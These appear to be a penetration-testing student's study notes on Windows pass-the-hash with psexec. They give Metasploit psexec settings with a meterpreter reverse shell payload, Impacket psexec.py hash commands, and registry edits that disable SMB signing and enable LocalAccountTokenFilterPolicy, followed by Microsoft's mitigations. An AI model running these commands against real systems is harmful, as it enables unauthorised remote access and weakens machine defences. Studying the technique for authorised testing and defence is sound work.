<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>psexec</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>psexec</h1><br/><br /><strong><h3>Prerequisite:</h3></strong><br />• NTLM hash &amp; user<br /><br /><strong><h3>Metasploit’s PsExec exploit module supports pass-the-hash capabilities</h3></strong><br /><a href="file://G:/Other computers/Yoga 520/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/psexec.png"><img src="images/860-1.png" alt="images/860-1.png" /></a><br />The psexec module is often used by penetration testers to obtain access to a given system that you already know the hashed credentials without cracking it.<br />With this module we can authenticate to the target machine via SMB with Metasploit(msf) <span style="text-decoration:underline;">as an admin user with only that admin&#39;s hash</span><br />   ◇ <span style="text-decoration:underline;">Metasploit psexec</span><br />   <div class="codebox"><pre>msf &gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>psexec<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST [victims]                           <span style="color:#0088ff;font-weight:400">#we can set more machines(range) in the network and test to &quot;pass the hash&quot; on them</span><br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> LHOST [your_linux_ip_address]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> PAYLOAD windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> SMBUser [admin_name]                      <span style="color:#0088ff;font-weight:400">#admin username</span><br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> SMBPass [LANMAN]<span style="color:#ff9d00;font-weight:700">:</span>[NT]                     <span style="color:#0088ff;font-weight:400">#administrator&#39;s hash in LM:NT format</span><br />msf &gt; show options                                  <span style="color:#0088ff;font-weight:400">#to review the settings for our attack</span><br />msf &gt; db_disconnect                                 <span style="color:#0088ff;font-weight:400">#at the time that we write there is a bug in msf, </span><br />                                                    <span style="color:#0088ff;font-weight:400">#to exploit we need to disconnect the database</span><br />msf &gt; exploit</pre></div><br />    Metasploit&#39;s PsExec exploit can realize that we are using a hash here instead of a password and launch its attack using pass-the-hash, making the target run the Metasploit payload<br />    If the pass-the-hash attack works successfully, you should get Meterpreter access to the target machine.<br />   ◇ <span style="text-decoration:underline;">Python3 psexec</span><br />   <div class="codebox"><pre>kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>doc<span style="color:#ff9d00;font-weight:700">/</span>python3-impacket<span style="color:#ff9d00;font-weight:700">/</span>examples<span style="color:#ff9d00;font-weight:700">/</span><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ psexec.py &lt;FQDN&gt;<span style="color:#ff9d00;font-weight:700">/</span>&lt;user&gt;<span style="color:#ff9d00;font-weight:700">:</span>&lt;password&gt;@&lt;ipAddress&gt;          <span style="color:#0088ff;font-weight:400">#with clear password</span><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ python3 psexec.py &lt;user&gt;@&lt;ipAddress&gt; -hashes &lt;LM<span style="color:#ff9d00;font-weight:700">:</span>NTLM&gt;  <span style="color:#0088ff;font-weight:400">#with hashes</span></pre></div><br />    <a href=""><img src="images/860-2.png" alt="images/860-2.png" /></a><br />    <a href=""><img src="images/860-3.png" alt="images/860-3.png" /></a><br />        <br /><br /><strong><h3>Possible error messages:</h3></strong><br />• <span style="color:#ff0000;">&quot;Exploit failed: ActiveRecord … Data has already been taken“</span><br />That is due to a bug in the Metasploit database feature and its interaction with credentials. You can bypass that problem by disconnecting from the database by typing &quot;db_disconnect” and then try to exploit it again.<br /><br />• <span style="color:#ff0000;">“Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::ErrorCode.......STATUS_ACCESS_DENIED (Command=117 WordCount=0) error”</span><br />That error occur when we try to access with a user that is in the Administrators group, but is not an “actual” administrator(RID-500). <br />This because Microsoft released a patch for Windows 7 and Server 2008 to prevent the ability to pass-the-hash with non-RID 500 local administrator accounts<br />Here the article: <a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/</a><br />A summary of the article is done below in &quot;Microsoft&#39;s Pass-the-Hash Mitigations&quot;<br />This happen because of two settings in the registry value, <br />The registry key that make the Windows system MORE vulnerable:<br />  <div class="codebox"><pre>HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>SOFTWARE<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>CurrentVersion<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>System<span style="color:#ff9d00;font-weight:700">\</span>LocalAccountTokenFilterPolicy   <span style="color:#0088ff;font-weight:400">#set the DWORD (32-bit) to 1</span><br />HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>System<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Services<span style="color:#ff9d00;font-weight:700">\</span>LanManServer<span style="color:#ff9d00;font-weight:700">\</span>Parameters<span style="color:#ff9d00;font-weight:700">\</span>RequireSecuritySignature        <span style="color:#0088ff;font-weight:400">#set the DWORD (32-bit) to 0</span></pre></div><br />    <strong>LocalAccountTokenFilterPolicy</strong> → set to 1  allow non RID-500 user accounts (for example users in the local administrator) to successfully pass-the-hash<br />To modify these values we have different possibilities:<br />• reg (meterpreter command):<br /><div class="codebox"><pre>meterpreter &gt; reg setval -k “HKEY_LOCAL_MACHINE<span style="color:#333333;font-weight:400">\S</span>oftware<span style="color:#333333;font-weight:400">\M</span>icrosoft<span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\C</span>urrentVersion<span style="color:#333333;font-weight:400">\P</span>olicies<span style="color:#333333;font-weight:400">\S</span>ystem” -v LocalAccountTokenFilterPolicy -t REG_DWORD -d 1<br />meterpreter &gt; reg setval -k “HKEY_LOCAL_MACHINE<span style="color:#333333;font-weight:400">\S</span>ystem<span style="color:#333333;font-weight:400">\C</span>urrentControlSet<span style="color:#333333;font-weight:400">\S</span>ervices<span style="color:#333333;font-weight:400">\L</span>anManServer<span style="color:#333333;font-weight:400">\P</span>arameters” -v RequireSecuritySignature -t REG_DWORD -d 0</pre></div><br />• reg (cmd command)(<a href="https://ss64.com/nt/reg.html">https://ss64.com/nt/reg.html</a>):<br /><div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg add HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>Software<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>CurrentVersion<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>System <span style="color:#ff9d00;font-weight:700">/</span>v LocalAccountTokenFilterPolicy <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">1</span> <span style="color:#ff9d00;font-weight:700">/</span>f<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg add HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>System<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Services<span style="color:#ff9d00;font-weight:700">\</span>LanManServer<span style="color:#ff9d00;font-weight:700">\</span>Parameters <span style="color:#ff9d00;font-weight:700">/</span>v RequireSecuritySignature <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">0</span> <span style="color:#ff9d00;font-weight:700">/</span>f</pre></div><br />   ◇ To query the value of the registry keys<br />   <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg query HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>Software<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>CurrentVersion<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>System <span style="color:#ff9d00;font-weight:700">/</span>v LocalAccountTokenFilterPolicy<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg query HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>System<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Services<span style="color:#ff9d00;font-weight:700">\</span>LanManServer<span style="color:#ff9d00;font-weight:700">\</span>Parameters <span style="color:#ff9d00;font-weight:700">/</span>v RequireSecuritySignature</pre></div><br />• Set-ItemProperty (powershell command):<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">Set-ItemProperty</span> <span style="color:#ff9d00;font-weight:700">-</span>Path HKLM<span style="color:#ff9d00;font-weight:700">:\</span>SOFTWARE<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>CurrentVersion<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>System <span style="color:#333333;font-weight:400">-Name</span> LocalAccountTokenFilterPolicy <span style="color:#333333;font-weight:400">-Value</span> <span style="color:#333333;font-weight:400">1</span> <span style="color:#ff9d00;font-weight:700">-Type</span> DWord<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">Set-ItemProperty</span> <span style="color:#ff9d00;font-weight:700">-</span>Path HKLM<span style="color:#ff9d00;font-weight:700">:\</span>System<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Services<span style="color:#ff9d00;font-weight:700">\</span>LanManServer<span style="color:#ff9d00;font-weight:700">\</span>Parameters –Name RequireSecuritySignature –Value <span style="color:#333333;font-weight:400">0</span> –<span style="color:#ff9d00;font-weight:700">Type</span> DWord</pre></div><br /><br /><br /><strong><h3>Microsoft&#39;s Pass-the-Hash Mitigations</h3></strong><br />Microsoft has released several patches in an attempt to mitigate pass-the hash attacks but it is a fundamentally part of internal network authentication protocols (LM C/R, NTLMv1, NTLMv2, Kerberos) and cannot be patched.<br /><strong>Patches:</strong><br />   ◇ <a href="https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2016/2871997?redirectedfrom=MSDN">Microsoft Security Advisory 2871997</a>  KB2871997 patch (released May 2014): Available patch for Windows 7/Server 2008 R2 and incorporated by default from Windows 8.1<br />      ▪ Adds two security identifiers (SIDs)<br />         - local accounts → S-1-5-113 (NT AUTHORITY\Local account) <br />         - local admins → S-1-5-114 (NT AUTHORITY\Local account and member of Administrators group)<br />         <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; WMIC useraccount get name,sid        <span style="color:#0088ff;font-weight:400">#list of users an their SID</span></pre></div><br />      ▪ Via Group Policy, you can restrict all remote administration using local accounts<br />   ◇ Windows Defender Credential Guard: Available only for Windows 10 and Server 2016/2019<br />      ▪  Isolates secrets (Local Security Authority Subsystem Service / lsass.exe) from the operating system using virtualization technology, Secure Boot, and Trusted Platform Module<br />      ▪ Credential Guard isn’t a defense against passing the hash, it’s a defense against attackers gaining access to hashes in the first place<br /><br />Bibliography:<br />• <a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/</a></div>
</body>
</html>
